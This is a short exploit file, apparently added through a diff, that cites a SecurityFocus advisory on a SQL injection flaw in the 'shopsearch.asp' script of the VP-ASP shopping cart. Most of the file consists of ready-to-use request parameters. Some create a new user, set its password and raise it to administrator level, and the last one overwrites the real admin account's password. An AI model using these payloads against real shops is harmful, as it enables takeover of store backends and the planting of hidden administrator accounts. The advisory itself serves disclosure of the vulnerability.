@@ -1,0 +1,15 @@
+source: http://www.securityfocus.com/bid/9133/info
+
+It has been reported that VP-ASP may be prone to a SQL injection vulnerability that may allow an attacker to disclose sensitive information by supplying malicious SQL code to the underlying database. The problem exists in the 'shopsearch.asp' script of the software. 
+
+This code creates a new administrative account:
+Keyword=&category=5); insert into tbluser (fldusername) values
+('qasdew')--&SubCategory=&hide=&action.x=46&action.y=6
+Keyword=&category=5); update tbluser set fldpassword='edsaqw' where
+fldusername='qasdew'--&SubCategory=All&action.x=33&action.y=6
+Keyword=&category=3); update tbluser set fldaccess='1' where
+fldusername='qasdew'--&SubCategory=All&action.x=33&action.y=6
+
+This code changes the administrator password:
+Keyword=&category=5); update tbluser set fldpassword='edsaqw' where
+fldusername='admin'--&SubCategory=All&action.x=33&action.y=6 
